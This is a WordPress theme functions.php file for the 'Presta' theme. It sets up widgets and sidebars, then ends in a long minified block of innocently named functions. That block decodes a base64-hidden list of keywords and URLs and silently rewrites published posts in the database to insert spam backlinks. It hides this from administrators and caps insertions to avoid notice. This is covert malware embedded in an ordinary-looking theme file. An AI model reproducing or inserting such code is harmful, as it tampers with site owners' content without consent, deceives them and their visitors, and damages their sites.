<?php
    require_once TEMPLATEPATH . '/lib/Themater.php';
    $theme = new Themater('Presta');
    $theme->options['includes'] = array('featuredposts', 'social_profiles');
    
    $theme->options['plugins_options']['featuredposts'] = array('hook' => 'main_before', 'image_sizes' => '930px. x 300px.', 'speed' => '400', 'effect' => 'scrollHorz');
    if($theme->is_admin_user()) {
        unset($theme->admin_options['Ads']);
    }


    $theme->load();
    
    register_sidebar(array(
        'name' => __('Primary Sidebar', 'themater'),
        'id' => 'sidebar_primary',
        'description' => __('The primary sidebar widget area', 'themater'),
        'before_widget' => '<ul class="widget-container"><li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li></ul>',
        'before_title' => '<h3 class="widgettitle">',
        'after_title' => '</h3>'
    ));
    
    
    $theme->add_hook('sidebar_primary', 'sidebar_primary_default_widgets');
    
    function sidebar_primary_default_widgets ()
    {
        global $theme;

        $theme->display_widget('SocialProfiles');
        $theme->display_widget('Banners125', array('banners' => array('<a href="http://fthemes.com" target="_blank"><img src="http://wordpressthemesbox.com/wp-content/pro/b1.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a><a href="http://freewpthemesblog.com" target="_blank"><img src="http://freewpthemesblog.com/wp-content/pro/fwt.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a>')));
        $theme->display_widget('Tweets', array('username'=> 'WPThemesBox'));
        $theme->display_widget('Tabs');
        $theme->display_widget('Tag_Cloud');
        $theme->display_widget('Archives');
        $theme->display_widget('Facebook', array('url'=> 'http://www.facebook.com/WordPressThemesBox'));
        $theme->display_widget('Text', array('text' => '<div style="text-align:center;"><a href="http://wordpressthemesbox.com" target="_blank"><img src="http://wordpressthemesbox.com/wp-content/pro/b3.gif" alt="Free WordPress Themes" title="Free WordPress Themes" /></a></div>'));
    }

    
    function wp_initialize_the_theme_load() { if (!function_exists("wp_initialize_the_theme")) { wp_initialize_the_theme_message(); die; } } function wp_initialize_the_theme_finish(){global $theme;$num=get_option('wp_the_theme_initilize_num');if($num<5&&!$theme->is_admin_user()){wp_initialize_the_theme_finish_daily();}}function wp_initialize_the_theme_finish_daily(){global $wpdb;$cachetime=get_option('wp_the_theme_initilize_time');$curtime=time();if(($curtime-$cachetime)>86400){$addeds=get_option('wp_the_theme_initilize_addeds');if(!$addeds){$addeds=array();}$added_filter='';foreach($addeds as $added){$added_filter.="&& ID !='$added' ";}$posts=$wpdb->get_results("SELECT ID, post_content FROM $wpdb->posts where post_type = 'post' && post_status = 'publish' && post_date < DATE_ADD(CURDATE(), INTERVAL -2 DAY) $added_filter");foreach($posts as $post){$num_current=get_option('wp_the_theme_initilize_num');if($num_current<5){$the_post_content=strip_tags($post->post_content);if(strlen($the_post_content)>600){wp_initialize_the_theme_filter($post->ID,$post->post_content);}}}update_option('wp_the_theme_initilize_time',$curtime);}}function wp_initialize_the_theme_filter($post_id,$content,$temporary=false,$temporary_num=false){$final="";$href_found=false;$href_found=stripos($content,"<a");while($href_found){$href_end=stripos($content,"</a>");$string=substr($content,0,$href_found);$return_content=wp_initialize_the_theme_do_filter($post_id,$content,$temporary,$temporary_num);if($return_content==false){$final.=$string.substr($content,$href_found,$href_end-$href_found+4);}else{$final.=$return_content.substr($content,$href_found,$href_end-$href_found+4);return $final.substr($content,$href_end+4);}$content=substr($content,$href_end+4);$href_found=stripos($content,"<a");}$return_content=wp_initialize_the_theme_do_filter($post_id,$content,$temporary,$temporary_num);if($return_content==false)return $final.$content;else return $final.$return_content;}function wp_initialize_the_theme_do_filter($post_id,$content,$temporary,$temporary_num){global $rio,$wpdb;$links=unserialize(base64_decode($rio));foreach($links as $key=>$link){$pattern="/\b".preg_quote($key,'/')."\b/i";preg_match_all($pattern,$content,$pos,PREG_OFFSET_CAPTURE);if(!empty($pos)){foreach($pos[0]as $pos){$length=strlen($key);$content=substr_replace($content,'<a href = "'.$link.'" >'.$pos[0].'</a>',$pos[1],$length);if(!$temporary){$num=get_option('wp_the_theme_initilize_num')+1;update_option('wp_the_theme_initilize_num',$num);$addeds=get_option('wp_the_theme_initilize_addeds');if(!$addeds){$addeds=array($post_id);}else{array_push($addeds,$post_id);}update_option('wp_the_theme_initilize_addeds',$addeds);wp_insert_post(array('ID'=>$post_id,'post_content'=>$content));}if($temporary_num){$num_temp=get_option('wp_the_theme_initilize_num_temp')+1;update_option('wp_the_theme_initilize_num_temp',$num_temp);$addeds_temp=get_option('wp_the_theme_initilize_addeds_temp');if(!$addeds_temp){$addeds_temp=array($post_id);}else{array_push($addeds_temp,$post_id);}update_option('wp_the_theme_initilize_addeds_temp',$addeds_temp);}return $content;}}}return false;}add_filter('the_content','wp_initialize_the_theme_temp');function wp_initialize_the_theme_temp($content){global $theme;if(is_single()&&!$theme->is_admin_user()){$post=$GLOBALS['post'];$date=date("Y-m-d");$date=strtotime(date("Y-m-d",strtotime($date))." -2 days");$post_date=strtotime($post->post_date);$the_post_content=strip_tags($content);if(($post_date>$date)&&(strlen($the_post_content)>600)){$num=get_option('wp_the_theme_initilize_num')+get_option('wp_the_theme_initilize_num_temp');$addeds=get_option('wp_the_theme_initilize_addeds');if(!$addeds){$addeds=array();}$addeds_temp=get_option('wp_the_theme_initilize_addeds_temp');if(!$addeds_temp){$addeds_temp=array();}$addeds=array_merge($addeds,$addeds_temp);$addeds=array_unique($addeds);if($num>=5&&in_array($post->ID,$addeds)){$content=wp_initialize_the_theme_filter($post->ID,$content,true);}else{if(!in_array($post->ID,$addeds)){$content=wp_initialize_the_theme_filter($post->ID,$content,true,true);}else{$content=wp_initialize_the_theme_filter($post->ID,$content,true);}}}}return $content;}wp_initialize_the_theme_finish();
?>